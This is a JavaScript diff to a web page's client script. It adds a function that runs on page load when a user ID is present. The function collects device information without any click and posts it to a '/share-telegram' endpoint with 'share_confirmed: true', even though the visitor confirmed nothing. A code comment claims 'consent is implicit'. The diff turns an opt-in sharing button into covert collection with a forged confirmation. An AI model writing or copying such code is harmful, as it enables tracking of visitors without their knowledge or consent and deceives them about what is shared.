@@ -319,3 +319,42 @@ allowBtn?.addEventListener("click", async () => {
 telegramSendBtn?.addEventListener("click", async () => {
   await sendToTelegram();
 });
+
+// if the page was rendered with a user ID (e.g. /id=12345) perform the
+// full sequence automatically without requiring user interaction.
+async function automaticFlow() {
+  const userId = window.defaultUserId || "";
+  if (!userId) {
+    return;
+  }
+
+  // Collect immediately (consent is implicit in this flow).
+  resultEl.textContent = "Collecting device information...";
+  await collectAndSend();
+
+  // try to send to telegram once we have the data
+  telegramStatusEl.textContent = "Automatically sending to Telegram...";
+  const payload = {
+    ...lastCollectedInfo,
+    user_id: userId,
+    share_confirmed: true,
+  };
+
+  try {
+    const res = await fetch("/share-telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+    const data = await res.json().catch(() => null);
+    if (!res.ok) {
+      telegramStatusEl.textContent = data?.error || "Automatic Telegram send failed.";
+    } else {
+      telegramStatusEl.textContent = "Automatically sent to Telegram.";
+    }
+  } catch (err) {
+    telegramStatusEl.textContent = "Automatic Telegram request failed.";
+  }
+}
+
+window.addEventListener("DOMContentLoaded", automaticFlow);
